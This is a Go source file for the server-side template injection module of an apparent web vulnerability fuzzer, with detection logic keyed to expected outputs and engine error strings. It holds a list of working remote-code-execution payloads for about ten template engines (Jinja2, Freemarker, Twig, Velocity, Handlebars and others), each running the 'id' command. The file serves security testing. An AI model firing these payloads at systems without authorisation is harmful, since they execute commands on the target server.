package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type SSTIModule struct{}

func (m *SSTIModule) Name() string        { return "ssti" }
func (m *SSTIModule) Description() string { return "Server-Side Template Injection" }

func (m *SSTIModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := sstiPayloads()
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.value, Point: point, Module: "ssti", Variant: p.variant,
				Metadata: map[string]string{"expected": p.expected}})
		}
	}
	return payloads
}

func (m *SSTIModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	expected := ""
	if payload.Metadata != nil {
		expected = payload.Metadata["expected"]
	}

	// Detecção por resultado esperado da expressão
	if expected != "" && strings.Contains(respBody, expected) && !strings.Contains(baseBody, expected) {
		return &Finding{
			Module:      "ssti",
			Severity:    "critical",
			Confidence:  "confirmed",
			Title:       "Server-Side Template Injection - " + payload.Variant,
			Description: "Template expression executed server-side, result present in response",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    "Expected result '" + expected + "' found in response",
			OWASP:       "A03:2021 Injection",
			CWE:         "CWE-1336",
		}
	}

	// Detection by template engine error
	templateErrors := []string{
		"jinja2.exceptions", "mako.exceptions", "django.template",
		"freemarker.core", "org.thymeleaf", "pebble",
		"twig", "smarty", "velocity",
		"template syntax error", "templateerror",
		"undefined variable", "unknown tag",
	}
	bodyLower := strings.ToLower(respBody)
	for _, e := range templateErrors {
		if strings.Contains(bodyLower, e) && !strings.Contains(strings.ToLower(baseBody), e) {
			return &Finding{
				Module:      "ssti",
				Severity:    "high",
				Confidence:  "high",
				Title:       "SSTI - Template engine error exposto",
				Description: "Template engine error revealed in response",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    e,
				OWASP:       "A03:2021 Injection",
				CWE:         "CWE-1336",
			}
		}
	}

	return nil
}

type sstiPayload struct {
	value    string
	variant  string
	expected string
}

func sstiPayloads() []sstiPayload {
	return []sstiPayload{
		// Detection/probe
		{`{{7*7}}`, "jinja2/twig", "49"},
		{`${7*7}`, "freemarker/mvel", "49"},
		{`#{7*7}`, "ruby-erb/thymeleaf", "49"},
		{`<%= 7*7 %>`, "erb", "49"},
		{`{{7*'7'}}`, "jinja2-confirm", "7777777"},
		{`${7*'7'}`, "freemarker-string", "7777777"},
		{`{7*7}`, "smarty/mako", "49"},
		{`{php}echo 7*7;{/php}`, "smarty-php", "49"},
		{`#set($x=7*7)$x`, "velocity", "49"},
		{`[[${7*7}]]`, "thymeleaf", "49"},

		// Jinja2 RCE chain
		{`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, "jinja2-rce", "uid="},
		{`{{''.__class__.__mro__[1].__subclasses__()}}`, "jinja2-subclasses", "subprocess"},
		{`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`, "jinja2-rce2", "uid="},
		{`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}`, "jinja2-rce3", "uid="},

		// Freemarker RCE
		{`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, "freemarker-rce", "uid="},
		{`${"freemarker.template.utility.Execute"?new()("id")}`, "freemarker-rce2", "uid="},
		{`[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}`, "freemarker-rce3", "uid="},

		// Thymeleaf RCE (Spring)
		{`__${T(java.lang.Runtime).getRuntime().exec('id')}__::`, "thymeleaf-rce", ""},
		{`${T(java.lang.Runtime).getRuntime().exec('id')}`, "spel-rce", ""},

		// Twig RCE
		{`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, "twig-rce", "uid="},
		{`{{['id']|filter('system')}}`, "twig-rce2", "uid="},

		// Mako
		{`<%import os%>${os.popen('id').read()}`, "mako-rce", "uid="},

		// Pebble
		{`{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`, "pebble-rce", ""},

		// Velocity
		{`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`, "velocity-rce", ""},

		// Handlebars
		{`{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`, "handlebars-rce", "uid="},

		// EJS (Node.js)
		{`<%= process.mainModule.require('child_process').execSync('id') %>`, "ejs-rce", "uid="},

		// Pug (Node.js)
		{`#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id')}()}`, "pug-rce", "uid="},
	}
}
